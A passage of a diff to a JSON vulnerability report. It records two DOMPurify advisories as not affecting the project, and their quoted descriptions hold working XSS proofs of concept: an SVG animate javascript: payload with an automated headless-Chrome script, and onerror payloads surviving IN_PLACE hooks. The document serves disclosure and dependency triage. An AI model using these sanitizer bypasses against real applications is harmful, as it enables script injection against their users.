`attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+      "published": "2026-10-22T16:24:23Z",
+      "updated": "2026-10-22T16:24:24Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Non-applicable. This relates to a transitive dependency used only when rendering markdown files which however are only defined internally."
+      },
+      "affects": [
+        {
+          "ref": "00b75305-3e7c-4346-8cba-4715894e797b"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mrv2-3pqr-j5jr",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.6,
+          "severity": "high",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "cwes": [
+        79,
+        693
+      ],
+      "description": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+      "published": "2026-10-22T16:24:52Z",
+      "updated": "2026-10-22T16:24:53Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Not applicable as this is a transitive dependency only used for internally controlled markdown rendering."
       },
       "affects": [
         {
